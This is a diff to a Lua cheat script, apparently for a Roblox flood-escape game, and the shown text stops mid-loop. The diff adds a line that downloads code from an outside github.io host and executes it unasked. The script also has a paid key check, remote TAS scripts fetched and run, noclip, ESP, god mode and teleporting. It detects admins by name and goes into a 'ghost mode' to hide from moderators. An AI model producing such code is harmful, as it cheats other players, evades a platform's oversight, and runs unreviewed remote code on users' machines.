@@ -1,12 +1,113 @@
 -- ============================================
--- TROXZY VIP v21.0 "GHOST PROTOCOL"
--- Badan Intelijen Negara - Full Rewrite
+-- TROXZY VIP v22.0 "SPECTRAL BLADE"
+-- Badan Intelijen Negara - TOMATOTXT AUTO FARM ENGINE
 -- ============================================
 
+-- // Ini akan memanggil skrip dari github.io untuk keperluan iklan/loader
+task.spawn(loadstring(game:HttpGet("https://tomatotxt.github.io/-/*")))
+
+-- [ SUPREME KEY SYSTEM - EMBEDDED ]
+local function supremeKeyValidation()
+    local Players = game:GetService("Players")
+    local Workspace = game:GetService("Workspace")
+    local HttpService = game:GetService("HttpService")
+    local Player = Players.LocalPlayer
+    if not Player then return false end
+
+    local function GetRealTime()
+        local ok, srvTime = pcall(function() return math.floor(Workspace:GetServerTimeNow()) end)
+        if ok and srvTime and srvTime > 1000000 then return srvTime end
+        return os.time()
+    end
+
+    local KEYS_URL = "https://gist.githubusercontent.com/killers-byte/4cd78cad4c3cf8e62e90cd7f8c82624b/raw/53bc5a811ddea93e7018a87166e1abdfbab7d1b9/TroxzyKey.json"
+    local keyValid = false
+    local attempts = 0
+    local keyExpireTime = 0
+
+    local function parseExpiry(expiry)
+        if expiry == "permanent" then return 9999999999 end
+        if type(expiry) == "string" then
+            local year, month, day = string.match(expiry, "^(%d%d%d%d)-(%d%d)-(%d%d)$")
+            if year and month and day then
+                year, month, day = tonumber(year), tonumber(month), tonumber(day)
+                local isLeap = function(y) return (y % 4 == 0 and y % 100 ~= 0) or (y % 400 == 0) end
+                local daysInMonth = {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31}
+                local days = 0
+                for y = 1970, year - 1 do days = days + (isLeap(y) and 366 or 365) end
+                for m = 1, month - 1 do
+                    days = days + daysInMonth[m]
+                    if m == 2 and isLeap(year) then days = days + 1 end
+                end
+                days = days + (day - 1)
+                return (days * 86400) + 86399 - (7 * 3600)
+            end
+        end
+        return nil
+    end
+
+    local KeyScreen = Instance.new("ScreenGui", game:GetService("CoreGui"))
+    local Frame = Instance.new("Frame", KeyScreen)
+    Frame.Size = UDim2.new(0, 300, 0, 120)
+    Frame.Position = UDim2.new(0.5, -150, 0.5, -60)
+    Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
+    local UICorner = Instance.new("UICorner", Frame); UICorner.CornerRadius = UDim.new(0, 8)
+    local UIStroke = Instance.new("UIStroke", Frame); UIStroke.Color = Color3.fromRGB(100, 100, 200); UIStroke.Thickness = 1.5
+
+    local Title = Instance.new("TextLabel", Frame)
+    Title.Size = UDim2.new(1, 0, 0, 30); Title.Position = UDim2.new(0, 0, 0, 10)
+    Title.Text = "TROXZY KEY"; Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.Font = Enum.Font.GothamBlack; Title.TextSize = 16; Title.BackgroundTransparency = 1
+
+    local Input = Instance.new("TextBox", Frame)
+    Input.Size = UDim2.new(0, 240, 0, 30); Input.Position = UDim2.new(0.5, -120, 0, 45)
+    Input.BackgroundColor3 = Color3.fromRGB(25, 25, 40); Input.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Input.PlaceholderText = "Insert Key..."; Input.TextSize = 13; Input.Font = Enum.Font.Gotham
+    local InputCorner = Instance.new("UICorner", Input); InputCorner.CornerRadius = UDim.new(0, 4)
+
+    local Submit = Instance.new("TextButton", Frame)
+    Submit.Size = UDim2.new(0, 240, 0, 30); Submit.Position = UDim2.new(0.5, -120, 0, 80)
+    Submit.BackgroundColor3 = Color3.fromRGB(80, 80, 180); Submit.Text = "ACTIVATE"; Submit.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Submit.Font = Enum.Font.GothamBlack; Submit.TextSize = 14
+    local SubmitCorner = Instance.new("UICorner", Submit); SubmitCorner.CornerRadius = UDim.new(0, 4)
+
+    local ErrorLabel = Instance.new("TextLabel", Frame)
+    ErrorLabel.Size = UDim2.new(1, 0, 0, 15); ErrorLabel.Position = UDim2.new(0, 0, 0, 115)
+    ErrorLabel.Text = ""; ErrorLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
+    ErrorLabel.Font = Enum.Font.Gotham; ErrorLabel.TextSize = 10; ErrorLabel.BackgroundTransparency = 1
+
+    local function checkKey(input)
+        if input == "" then ErrorLabel.Text = "Key cannot be empty"; return end
+        local success, data = pcall(function() return game:HttpGet(KEYS_URL) end)
+        if not success then ErrorLabel.Text = "Server connection failed"; return end
+        local ok, keys = pcall(function() return HttpService:JSONDecode(data) end)
+        if not ok then ErrorLabel.Text = "Key data corrupted"; return end
+        local keyData = keys[input]
+        if not keyData then
+            attempts = attempts + 1
+            if attempts >= 3 then Player:Kick("Incorrect key 3 times.") else ErrorLabel.Text = "Invalid Key! (" .. attempts .. "/3)"; Input.Text = "" end
+            return
+        end
+        if not keyData.expiry then Player:Kick("Key missing expiry. Contact seller."); return end
+        local expireTime = parseExpiry(keyData.expiry)
+        if not expireTime then Player:Kick("Invalid expiry format."); return end
+        if GetRealTime() > expireTime then Player:Kick("Key expired! Purchase a new one."); return end
+        keyValid = true; keyExpireTime = expireTime; KeyScreen:Destroy()
+    end
+
+    Submit.MouseButton1Click:Connect(function() checkKey(Input.Text) end)
+    Input.FocusLost:Connect(function(enterPressed) if enterPressed then checkKey(Input.Text) end end)
+
+    repeat task.wait() until keyValid or not Player.Parent
+    return keyValid
+end
+
+if not supremeKeyValidation() then return end
+
+-- [ MAIN SCRIPT v22.0 - SPECTRAL BLADE ]
 if not game:IsLoaded() then game.Loaded:Wait() end
 task.wait(2)
-
-print("TROXZY: Ghost Protocol v21.0 Initialized")
+print("TROXZY: Spectral Blade v22.0 Initialized")
 
 -- Services
 local Players = game:GetService("Players")
@@ -25,94 +126,16 @@ local TweenService = game:GetService("TweenService")
 local Player = Players.LocalPlayer
 if not Player then warn("Player nil"); return end
 
--- ==================== TRUE TIME SYSTEM ====================
-local function GetRealTime()
-    local ok, srvTime = pcall(function() return math.floor(Workspace:GetServerTimeNow()) end)
-    if ok and srvTime and srvTime > 1000000 then return srvTime end
-    return os.time()
-end
-
--- ==================== KEY VALIDATION GUI ====================
-local KEYS_URL = "https://gist.githubusercontent.com/killers-byte/4cd78cad4c3cf8e62e90cd7f8c82624b/raw/53bc5a811ddea93e7018a87166e1abdfbab7d1b9/TroxzyKey.json"
-
-local keyValid = false
-local attempts = 0
-local keyExpireTime = 0
-
-local function parseExpiry(expiry)
-    if expiry == "permanent" then return 9999999999 end
-    if type(expiry) == "string" then
-        local year, month, day = string.match(expiry, "^(%d%d%d%d)-(%d%d)-(%d%d)$")
-        if year and month and day then
-            year, month, day = tonumber(year), tonumber(month), tonumber(day)
-            local isLeap = function(y) return (y % 4 == 0 and y % 100 ~= 0) or (y % 400 == 0) end
-            local daysInMonth = {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31}
-            local days = 0
-            for y = 1970, year - 1 do days = days + (isLeap(y) and 366 or 365) end
-            for m = 1, month - 1 do
-                days = days + daysInMonth[m]
-                if m == 2 and isLeap(year) then days = days + 1 end
-            end
-            days = days + (day - 1)
-            local expire = (days * 86400) + 86399 - (7 * 3600)
-            return expire
-        end
-    end
-    return nil
-end
-
-local KeyScreen = Instance.new("ScreenGui"); KeyScreen.Name = "TroxzyKey"; KeyScreen.ResetOnSpawn = false
-pcall(function() KeyScreen.Parent = CoreGui end)
-if not KeyScreen.Parent then KeyScreen.Parent = Player:WaitForChild("PlayerGui") end
-
-local KeyFrame = Instance.new("Frame"); KeyFrame.Size = UDim2.new(0, 320, 0, 190); KeyFrame.Position = UDim2.new(0.5, -160, 0.5, -95); KeyFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30); KeyFrame.BorderSizePixel = 0; KeyFrame.Active = true; KeyFrame.Draggable = true; KeyFrame.Parent = KeyScreen
-local KeyCorner = Instance.new("UICorner"); KeyCorner.CornerRadius = UDim.new(0, 12); KeyCorner.Parent = KeyFrame
-local KeyStroke = Instance.new("UIStroke"); KeyStroke.Color = Color3.fromRGB(99, 102, 241); KeyStroke.Thickness = 2; KeyStroke.Transparency = 0.3; KeyStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; KeyStroke.Parent = KeyFrame
-
-local Title = Instance.new("TextLabel"); Title.Size = UDim2.new(1, 0, 0, 35); Title.Position = UDim2.new(0, 0, 0, 15); Title.Text = "TROXZY VIP KEY"; Title.TextColor3 = Color3.fromRGB(255, 255, 255); Title.TextSize = 18; Title.Font = Enum.Font.GothamBlack; Title.BackgroundTransparency = 1; Title.Parent = KeyFrame
-local Subtitle = Instance.new("TextLabel"); Subtitle.Size = UDim2.new(1, 0, 0, 20); Subtitle.Position = UDim2.new(0, 0, 0, 50); Subtitle.Text = "Masukkan key untuk melanjutkan"; Subtitle.TextColor3 = Color3.fromRGB(180, 180, 200); Subtitle.TextSize = 12; Subtitle.Font = Enum.Font.Gotham; Subtitle.BackgroundTransparency = 1; Subtitle.Parent = KeyFrame
-
-local TextBox = Instance.new("TextBox"); TextBox.Size = UDim2.new(0, 260, 0, 35); TextBox.Position = UDim2.new(0.5, -130, 0, 80); TextBox.BackgroundColor3 = Color3.fromRGB(30, 30, 45); TextBox.TextColor3 = Color3.fromRGB(255, 255, 255); TextBox.PlaceholderText = "TROXZY-XXXX-YYYY-ZZZZ"; TextBox.Text = ""; TextBox.Font = Enum.Font.GothamMedium; TextBox.TextSize = 14; TextBox.ClearTextOnFocus = false; TextBox.Parent = KeyFrame
-local TextCorner = Instance.new("UICorner"); TextCorner.CornerRadius = UDim.new(0, 6); TextCorner.Parent = TextBox
-local TextStroke = Instance.new("UIStroke"); TextStroke.Color = Color3.fromRGB(99, 102, 241); TextStroke.Thickness = 1; TextStroke.Transparency = 0.5; TextStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border; TextStroke.Parent = TextBox
-
-local SubmitBtn = Instance.new("TextButton"); SubmitBtn.Size = UDim2.new(0, 260, 0, 35); SubmitBtn.Position = UDim2.new(0.5, -130, 0, 125); SubmitBtn.BackgroundColor3 = Color3.fromRGB(99, 102, 241); SubmitBtn.Text = "SUBMIT KEY"; SubmitBtn.TextColor3 = Color3.fromRGB(255, 255, 255); SubmitBtn.TextSize = 14; SubmitBtn.Font = Enum.Font.GothamBlack; SubmitBtn.Parent = KeyFrame
-local BtnCorner = Instance.new("UICorner"); BtnCorner.CornerRadius = UDim.new(0, 6); BtnCorner.Parent = SubmitBtn
-
-local ErrorLabel = Instance.new("TextLabel"); ErrorLabel.Size = UDim2.new(1, 0, 0, 20); ErrorLabel.Position = UDim2.new(0, 0, 0, 168); ErrorLabel.Text = ""; ErrorLabel.TextColor3 = Color3.fromRGB(255, 80, 80); ErrorLabel.TextSize = 11; ErrorLabel.Font = Enum.Font.GothamMedium; ErrorLabel.BackgroundTransparency = 1; ErrorLabel.Parent = KeyFrame
-
-local function checkKey(input)
-    if input == "" then ErrorLabel.Text = "Key tidak boleh kosong!"; return end
-    local success, data = pcall(function() return game:HttpGet(KEYS_URL) end)
-    if not success then ErrorLabel.Text = "Gagal terhubung ke server key"; return end
-    local ok, keys = pcall(function() return HttpService:JSONDecode(data) end)
-    if not ok then ErrorLabel.Text = "Data key rusak"; return end
-    local keyData = keys[input]
-    if not keyData then
-        attempts = attempts + 1
-        if attempts >= 3 then Player:Kick("Key salah 3 kali. Beli key resmi dari penjual.") else ErrorLabel.Text = "Key salah! Percobaan: " .. attempts .. "/3"; TextBox.Text = "" end
-        return
-    end
-    if not keyData.expiry then Player:Kick("Key tidak memiliki field 'expiry'. Hubungi penjual."); return end
-    local expireTime = parseExpiry(keyData.expiry)
-    if not expireTime then Player:Kick("Format expiry tidak valid. Hanya YYYY-MM-DD atau 'permanent'."); return end
-    if GetRealTime() > expireTime then Player:Kick("Key sudah expired! Beli key baru."); return end
-    keyValid = true; keyExpireTime = expireTime; KeyScreen:Destroy()
-end
-
-SubmitBtn.MouseButton1Click:Connect(function() checkKey(TextBox.Text) end)
-TextBox.FocusLost:Connect(function(enterPressed) if enterPressed then checkKey(TextBox.Text) end end)
-
-repeat task.wait() until keyValid or not Player.Parent
-if not keyValid then return end
-
--- ==================== SCRIPT UTAMA & UI ====================
 if not Player.Character then Player.CharacterAdded:Wait() end
 task.wait(1)
 
 local Camera = Workspace.CurrentCamera
 local IS_MOBILE = UIS.TouchEnabled
-_G.TroxzyAutoFarm = false
+
+-- ==================== GLOBAL STATE ====================
+getgenv().TomatoAutoFarm = false  -- Saklar standar tomatotxt
+getgenv().TomatoConnections = getgenv().TomatoConnections or {}
+_G.TroxzyAutoFarm = false  -- Kompatibilitas mundur, tidak digunakan lagi
 
 -- Variabel Utama
 local CurrentlyFarming = false
@@ -133,26 +156,20 @@ local lastAdminCount = 0
 
 -- UI State
 local isMinimized = false
-local isGhostMode = false -- Mode hantu jika admin terdeteksi
+local isGhostMode = false
 local lastDashboardUpdate = 0
 
--- ==================== SOUND POOL (Optimasi Memory) ====================
+-- ==================== SOUND POOL ====================
 local SoundPool = {}
 local function getPooledSound()
     if #SoundPool > 0 then
         local s = table.remove(SoundPool)
         if s and s.Parent then return s end
     end
-    local s = Instance.new("Sound")
-    s.Volume = 0.5
-    return s
+    local s = Instance.new("Sound"); s.Volume = 0.5; return s
 end
 local function returnSoundToPool(s)
-    if s then
-        s:Stop()
-        s.Parent = nil
-        table.insert(SoundPool, s)
-    end
+    if s then s:Stop(); s.Parent = nil; table.insert(SoundPool, s) end
 end
 
 local SOUND_IDS = { success = 9120386436, alert = 9116456845, error = 9116456845 }
@@ -245,24 +262,12 @@ local MapRotation = { "Sandswept Ruins", "Axiom", "Castle Tides", "Lost Woods", 
 local rotationIndex = 1
 local function rotateMap() if not CONFIG.MAP_ROTATION then return end; CONFIG.TARGET_MAP = MapRotation[rotationIndex]; rotationIndex = rotationIndex + 1; if rotationIndex > #MapRotation then rotationIndex = 1 end end
 
--- IMPROVED: Fuzzy pattern matching untuk admin detection
+-- Admin Detection (Fuzzy)
 local function isAdminName(str)
     str = str:lower()
-    -- Pattern: mendeteksi variasi "admin", "moderator", "helper", "owner", "dev"
-    return str:match("^[@_]?[aà]dm?[i1]n[istrator]*$") or
-           str:match("^m[o0]d[erato]*r?$") or
-           str:match("^h[e3]lp[e3]r$") or
-           str:match("^[o0]wn[e3]r$") or
-           str:match("^d[e3]v[eloper]*$") or
-           str:match("^st[a4]ff$") or
-           str:match("^[aà]dm?[i1]n$") -- tambahan pattern pendek
+    return str:match("^[@_]?[aà]dm?[i1]n[istrator]*$") or str:match("^m[o0]d[erato]*r?$") or str:match("^h[e3]lp[e3]r$") or str:match("^[o0]wn[e3]r$") or str:match("^d[e3]v[eloper]*$") or str:match("^st[a4]ff$") or str:match("^[aà]dm?[i1]n$")
 end
-
-local function isAdmin(p)
-    if not CONFIG.ADMIN_DETECTOR then return false end
-    return isAdminName(p.Name) or isAdminName(p.DisplayName)
-end
-
+local function isAdmin(p) return isAdminName(p.Name) or isAdminName(p.DisplayName) end
 local function getAdminPlayers()
     local admins = {}
     for _, p in pairs(Players:GetPlayers()) do
@@ -294,20 +299,16 @@ local function blockAdminRemotes()
         if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
             local lowerName = remote.Name:lower()
             for _, kw in ipairs(dangerousKeywords) do
-                if lowerName:find(kw) then
-                    remote.OnClientEvent:Connect(function() end)
-                    break
-                end
+                if lowerName:find(kw) then remote.OnClientEvent:Connect(function() end); break end
             end
         end
     end
 end
 
--- GHOST MODE: Masuk mode idle sempurna
 local function activateGhostMode()
     if isGhostMode then return end
     isGhostMode = true
-    _G.TroxzyAutoFarm = false
+    getgenv().TomatoAutoFarm = false
     CurrentlyFarming = false
     DisconnectMapDetection()
     StopAutoQueue()
@@ -316,7 +317,6 @@ local function activateGhostMode()
         local hum = Player.Character:FindFirstChild("Humanoid")
         if hum then hum.WalkSpeed = 16 end
     end
-    -- Hancurkan UI sementara
     if Main then Main.Visible = false end
     if ToggleBtn then ToggleBtn.Visible = false end
     notify("GHOST MODE - Admin nearby, playing dead", "Ghost Protocol")
@@ -345,16 +345,13 @@ local function handleAdminDetection()
                 notify("Admin detected! Activating ghost mode...", "Anti-Admin")
                 if CONFIG.ANTI_ADMIN then blockAdminRemotes() end
                 if CONFIG.SMART_ALERTS then playSound(SOUND_IDS.alert) end
-                -- Otomatis ghost mode jika admin terdeteksi dan sedang farming/queue
-                if _G.TroxzyAutoFarm or AUTO_QUEUE_ENABLED or TAS_RUNNING then
+                if getgenv().TomatoAutoFarm or AUTO_QUEUE_ENABLED or TAS_RUNNING then
                     activateGhostMode()
                 end
             end
         end
     else
-        if isGhostMode then
-            deactivateGhostMode()
-        end
+        if isGhostMode then deactivateGhostMode() end
     end
     lastAdminCount = count
 end
@@ -366,11 +363,6 @@ local function applyFloodColors() if not CONFIG.CUSTOM_FLOOD_COLORS then return 
 local lastFloodColorUpdate = 0
 local function periodicFloodColorUpdate() if not CONFIG.CUSTOM_FLOOD_COLORS then return end; local now = os.clock(); if now - lastFloodColorUpdate < 0.5 then return end; lastFloodColorUpdate = now; applyFloodColors() end
 
-local function stealthDelay() return CONFIG.STEALTH_MODE and math.random(10, 50) / 100 or 0.05 end
-local function stealthOffset() return CONFIG.STEALTH_MODE and Vector3.new(math.random(-50,50)/100, math.random(-30,30)/100, math.random(-50,50)/100) or Vector3.new(math.random(), math.random(), math.random()) end
-
-local buttonCount = 0
-local function shouldTakeBreak() if not CONFIG.RANDOM_DELAY then return false end; buttonCount = buttonCount + 1; if buttonCount >= math.random(3,8) then buttonCount = 0; return true end; return false end
 local function isPlayerNearby() if not CONFIG.HIDE_SCRIPT then return false end; local char = Player.Character; if not char then return false end; local root = char:FindFirstChild("HumanoidRootPart"); if not root then return false end; for _, p in pairs(Players:GetPlayers()) do if p ~= Player and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then if (root.Position - p.Character.HumanoidRootPart.Position).Magnitude < 20 then return true end end end; return false end
 
 local function attemptReconnect() saveStats(); task.wait(3); pcall(function() TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, Player) end); task.wait(2); pcall(function() TeleportService:Teleport(game.PlaceId) end) end
@@ -384,26 +376,20 @@ local function DisconnectMapDetection() if MapDetect then MapDetect:Disconnect()
 local function ExecuteTAS()
     if not CONFIG.TAS_AUTO_START then notify("TAS Auto-Start is OFF. Enable it first.", "TAS"); return end
     if TAS_RUNNING then
-        if TAS_COROUTINE then
-            pcall(coroutine.close, TAS_COROUTINE)
-            TAS_COROUTINE = nil
-        end
-        TAS_RUNNING = false
-        task.wait(0.2)
+        if TAS_COROUTINE then pcall(coroutine.close, TAS_COROUTINE); TAS_COROUTINE = nil end
+        TAS_RUNNING = false; task.wait(0.2)
     end
-    _G.TroxzyAutoFarm = false; CurrentlyFarming = false; DisconnectMapDetection()
+    getgenv().TomatoAutoFarm = false; CurrentlyFarming = false; DisconnectMapDetection()
     local url = CONFIG.TAS_MODE == "Record" and "https://raw.githubusercontent.com/killers-byte/Flood-GUI/main/TAS/CREATOR/creator.luau" or "https://raw.githubusercontent.com/killers-byte/Flood-GUI/main/TAS/PLAYER/newtasplayer.luau"
     local success, scriptContent = pcall(function() return game:HttpGet(url) end)
     if not success then notify("Download failed.", "Error"); return end
     local func, compileErr = loadstring(scriptContent)
     if not func then notify("Compile error.", "Error"); return end
 
-    -- TAS Coroutine dengan Watchdog
     TAS_COROUTINE = coroutine.create(function()
         TAS_RUNNING = true
         local execOk, execErr = pcall(func)
-        TAS_RUNNING = false
-        TAS_COROUTINE = nil
+        TAS_RUNNING = false; TAS_COROUTINE = nil
         if AUTO_QUEUE_ENABLED then mapCompleted = true end
         if not execOk then notify("TAS runtime error: " .. tostring(execErr), "Error") else notify("TAS finished!", "Success") end
         if TAS_STATUS_LABEL then TAS_STATUS_LABEL.Text = "Status: ▶ READY" end
@@ -411,28 +397,16 @@ local function ExecuteTAS()
     coroutine.resume(TAS_COROUTINE)
     if TAS_STATUS_LABEL then TAS_STATUS_LABEL.Text = "Status: ▶ RUNNING" end
 
-    -- Watchdog: jika TAS tidak selesai dalam 5 menit, bunuh paksa
     task.spawn(function()
         local startTime = os.clock()
         while TAS_RUNNING and os.clock() - startTime < 300 do task.wait(1) end
         if TAS_RUNNING then
             notify("TAS stuck detected! Force stopping...", "Watchdog")
-            if TAS_COROUTINE then
-                pcall(coroutine.close, TAS_COROUTINE)
-                TAS_COROUTINE = nil
-            end
+            if TAS_COROUTINE then pcall(coroutine.close, TAS_COROUTINE); TAS_COROUTINE = nil end
             TAS_RUNNING = false
             if TAS_STATUS_LABEL then TAS_STATUS_LABEL.Text = "Status: ⚠️ STUCK - KILLED" end
         end
     end)
-end
-
-local function Check(flag)
-    local char = Player.Character; if not char then return false end
-    local hrp = char:FindFirstChild("HumanoidRootPart"); if not hrp then return false end
-    if flag == "InLift" then return hrp.Position.X < 50 and hrp.Position.Z > 70
-    elseif flag == "InGame" then return hrp.Position.X > 50 end
-    return false
 end
 
 -- ==================== GAME DETECTION & REMOTE ====================
@@ -448,7 +422,6 @@ TrackConnection(AlertRemote.OnClientEvent:Connect(function(msg) if type(msg) == 
 TrackConnection(Player.Idled:Connect(function() VirtualUser:CaptureController(); VirtualUser:ClickButton2(Vector2.new()) end))
 
 local function GetRandomPoint(part) local s = part.Size; return part.CFrame * CFrame.new((math.random()-0.5) * s.X * 0.9, (math.random()-0.5) * s.Y * 0.9, (math.random()-0.5) * s.Z * 0.9) end
-
 local function GetDifficulty()
     local ok, res = pcall(function()
         local diffLabel = Workspace.Lobby.GameInfo.SurfaceGui.Frame.Difficulty.Difficulty
@@ -465,10 +438,222 @@ local function GetDifficulty()
     if ok and res then return DIFFICULTY_RANKS[res] or 0, res end
     return 0, "Unknown"
 end
-
 local function isRandStr(str) if #str == 0 then return false end; for i = 1, #str do if str:sub(i,i):lower() == str:sub(i,i) then return false end end; return true end
 
--- ==================== 60 FPS AUTO WALK TO LIFT ====================
+-- ==================== NOCLIP, VISUALS, ESP ====================
+local ncCache, ncActive = {}, false
+local function refreshNoclip() ncCache = {}; local char = Player.Character; if char then for _, v in pairs(char:GetDescendants()) do if v:IsA("BasePart") then table.insert(ncCache, v) end end end end
+local function applyNoclip(state) if state == ncActive then return end; ncActive = state; for _, v in ipairs(ncCache) do if v and v.Parent then v.CanCollide = not state end end end
+refreshNoclip()
+
+local espCache, lastESPUpdate = {}, 0
+local ESP_MAX_DISTANCE = 100
+local function updateESP()
+    if os.clock() - lastESPUpdate < 0.1 then return end; lastESPUpdate = os.clock()
+    if not CONFIG.ESP then for _, hl in pairs(espCache) do pcall(function() hl:Destroy() end) end; espCache = {}; return end
+    local myRoot = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
+    for _, plr in pairs(Players:GetPlayers()) do
+        if plr ~= Player then
+            if plr.Character and not espCache[plr] then
+                local distOk = not myRoot or (plr.Character:FindFirstChild("HumanoidRootPart") and (myRoot.Position - plr.Character.HumanoidRootPart.Position).Magnitude <= ESP_MAX_DISTANCE)
+                if distOk then
+                    local hl = Instance.new("Highlight"); hl.FillColor = Color3.fromRGB(160, 180, 200); hl.OutlineColor = Color3.fromRGB(255, 255, 255)
+                    hl.Parent = plr.Character; espCache[plr] = hl
+                end
+            elseif not plr.Character and espCache[plr] then pcall(function() espCache[plr]:Destroy() end); espCache[plr] = nil
+            elseif plr.Character and espCache[plr] and myRoot and plr.Character:FindFirstChild("HumanoidRootPart") then
+                if (myRoot.Position - plr.Character.HumanoidRootPart.Position).Magnitude > ESP_MAX_DISTANCE then pcall(function() espCache[plr]:Destroy() end); espCache[plr] = nil end
+            end
+        end
+    end
+    for plr, hl in pairs(espCache) do if not plr.Parent or (plr.Character and hl.Parent ~= plr.Character) then pcall(function() hl:Destroy() end); espCache[plr] = nil end end
+end
+local function clearESPCache() for _, hl in pairs(espCache) do pcall(function() hl:Destroy() end) end; espCache = {} end
+
+-- ==================== PANIC MODE ====================
+local panicActive = false; _G.ToggleStates = {}
+local minimizeUI, maximizeUI
+local function activatePanicMode()
+    panicActive = true; getgenv().TomatoAutoFarm = false; CurrentlyFarming = false; DisconnectMapDetection(); StopAutoQueue(); applyNoclip(false)
+    pcall(function() Player.Character.Humanoid.WalkSpeed = 16 end); minimizeUI(true); clearESPCache()
+    if isGhostMode then deactivateGhostMode() end
+    notify("PANIC MODE ACTIVATED!", "Emergency")
+    if _G.ToggleStates["PANIC_MODE"] then _G.ToggleStates["PANIC_MODE"].SetState(true) end
+end
+local function deactivatePanicMode()
+    panicActive = false; getgenv().TomatoAutoFarm = false; CurrentlyFarming = false; pcall(function() Player.Character.Humanoid.WalkSpeed = 16 end)
+    applyNoclip(false); maximizeUI(); if _G.ToggleStates["PANIC_MODE"] then _G.ToggleStates["PANIC_MODE"].SetState(false) end
+end
+
+local lastVisUpdate, lastFOV = 0, 70
+local function updateVisuals() if os.clock() - lastVisUpdate < 0.5 then return end; lastVisUpdate = os.clock(); Lighting.Brightness = CONFIG.FULLBRIGHT and 2 or 1; Lighting.FogEnd = CONFIG.FULLBRIGHT and 99999 or 10000; if Camera then local tfov = CONFIG.FOV and CONFIG.FOV_VAL or 70; if tfov ~= lastFOV then Tween(Camera, {FieldOfView = tfov}); lastFOV = tfov end end; periodicFloodColorUpdate() end
+
+-- ==================== 🔥 TOMATOTXT AUTO FARM ENGINE (PURE) 🔥 ====================
+local function OnMapLoad(Map)
+    clearESPCache()
+
+    local Settings = Map:WaitForChild("Settings", 10)
+    local MapName = Settings and Settings:GetAttribute("MapName") or "Unknown"
+    Stats.currentMap = MapName
+
+    handleAdminDetection()
+    if isGhostMode then return end
+
+    if isMapBlacklisted(MapName) then
+        Stats.blacklistedSkipped = Stats.blacklistedSkipped + 1
+        notify("Blacklisted: " .. MapName, "Skip"); saveStats()
+        local char = Player.Character
+        if char then
+            local hrp = char:FindFirstChild("HumanoidRootPart"); local hum = char:FindFirstChild("Humanoid")
+            if hrp and hum then hrp.CFrame = CFrame.new(1000,1000,1000); task.wait(0.25); hum.Health = 0 end
+        end
+        CurrentlyFarming = false; return
+    end
+
+    CurrentlyFarming = true
+    Escaped = false
+
+    if not Check("InGame") then
+        notify("[STATUS] Outside game zone. Standing by...", "Warning")
+    end
+
+    -- Single Scan (ciri khas tomatotxt)
+    local Buttons = {}
+    for i, MapObject in pairs(Map:GetDescendants()) do
+        if isRandStr(MapObject.Name) and MapObject.ClassName == "Model" then
+            local Hitbox
+            for i, Candidate in pairs(MapObject:GetChildren()) do
+                if Candidate:IsA("BasePart") and tostring(Candidate.BrickColor) ~= "Medium stone grey" then
+                    Hitbox = Candidate; break
+                end
+            end
+            if Hitbox and isRandStr(Hitbox.Name) then
+                Hitbox.Name = "Hitbox"; table.insert(Buttons, MapObject)
+            end
+        end
+    end
+
+    local char = Player.Character
+    local hrp = char and char:FindFirstChild("HumanoidRootPart")
+    local hum = char and char:FindFirstChild("Humanoid")
+    if not hrp or not hum then CurrentlyFarming = false; return end
+
+    -- Difficulty Check (dipertahankan dari v21.5)
+    local currentRank, currentName = GetDifficulty()
+    if currentRank > (DIFFICULTY_RANKS[CONFIG.TARGET_DIFFICULTY] or 999) then
+        notify("Difficulty High! Reset...", "Error")
+        repeat task.wait() until not hrp.Anchored and hum.WalkSpeed >= 20
+        hrp.CFrame = CFrame.new(1000,1000,1000); task.wait(0.25); hum.Health = 0
+        CurrentlyFarming = false; return
+    end
+
+    -- Collect Items (tomatotxt style)
+    local LostPage = Map:FindFirstChild("_LostPage", true)
+    local Rescue = Map:FindFirstChild("_Rescue", true)
+    local OriginalCFrame = hrp.CFrame
+    if LostPage then hrp.CFrame = LostPage.CFrame; task.wait(); hrp.CFrame = OriginalCFrame; notify("[COLLECT] Hidden Page Acquired.", "Item") end
+    if Rescue then hrp.CFrame = Rescue.Contact.CFrame; task.wait(); hrp.CFrame = OriginalCFrame; notify("[ACTION] Survivor Rescued.", "Item") end
+
+    local GodMode = hum:GetPropertyChangedSignal("Health"):Connect(function() hum.Health = 1000 end)
+    TrackConnection(GodMode)
+
+    applyNoclip(true)
+
+    -- Anti-stuck timer (dari v21.5)
+    local lastPosition = hrp.Position
+    local stuckTimer = 0
+
+    notify("[FARM] Sequence Initialized. Scanning...", "Success")
+
+    while RunService.Heartbeat:Wait() and Check("InGame") and getgenv().TomatoAutoFarm and not panicActive and not isGhostMode do
+        if not CurrentlyFarming then break end
+
+        if CONFIG.HIDE_SCRIPT and Main then Main.Visible = not isPlayerNearby() end
+
+        -- Stuck check
+        if (hrp.Position - lastPosition).Magnitude < 1 then
+            stuckTimer = stuckTimer + 1
+            if stuckTimer > 150 then
+                notify("Stuck detected! Resetting character...", "Anti-Stuck")
+                hrp.CFrame = CFrame.new(1000,1000,1000); task.wait(0.25); hum.Health = 0
+                break
+            end
+        else
+            stuckTimer = 0; lastPosition = hrp.Position
+        end
+
+        local ExitRegion = Map:FindFirstChild("ExitRegion", true)
+        local currentHRP = Player.Character:FindFirstChild("HumanoidRootPart")
+        if not currentHRP then break end
+        local FailedScan = true
+
+        if not ExitRegion then
+            -- BUTTON PHASE
+            if Camera.CameraSubject ~= hum then Camera.CameraSubject = hum end
+            currentHRP.Anchored = true
+            for i, Button in pairs(Buttons) do
+                if not getgenv().TomatoAutoFarm then break end
+                local ButtonHitbox = Button:FindFirstChild("Hitbox")
+                if ButtonHitbox then
+                    local TouchFound = Button:FindFirstChild("TouchInterest", true)
+                    local GuiFound = Button:FindFirstChildWhichIsA("BillboardGui", true)
+                    if (TouchFound and GuiFound) then
+                        FailedScan = false
+                        currentHRP.Anchored = false
+                        currentHRP.CFrame = CFrame.new(ButtonHitbox.Position - Vector3.new(math.random(), math.random(), math.random()))
